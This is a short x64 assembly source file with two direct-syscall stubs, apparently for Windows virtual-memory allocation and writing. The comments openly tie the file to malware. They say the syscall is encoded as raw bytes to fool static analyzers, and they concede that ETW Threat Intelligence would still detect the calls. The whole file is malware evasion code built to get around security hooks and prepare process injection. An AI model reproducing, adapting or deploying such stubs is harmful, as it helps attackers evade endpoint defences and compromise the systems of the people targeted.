section .text
global CustAVM
global CustWVM

CustAVM:
    mov r10, rcx
    mov rax, 0x18   ; Load the value of smID into RAX
    db 0x0F, 0x05   ; Encoded `syscall` instruction to trick a poorly written static analyzer
    ret             ; Return to caller. Note that Event Tracing for Windows Threat Intelligence (ETW-TI) will detect that the RIP will point directly to a memory address inside the malware and not the traditionnal ntdll. Oupsy

CustWVM:
    mov r10, rcx    ; Move ProcessHandle to R10
    mov rax, 0x3A   ; Load the value of smID into RAX
    db 0x0F, 0x05   ; Encoded `syscall` instruction to trick a poorly written static analyzer
    ret             ; Return to caller. Note that Event Tracing for Windows Threat Intelligence (ETW-TI) will detect that the RIP will point directly to a memory address inside the malware and not the traditionnal ntdll. Oupsy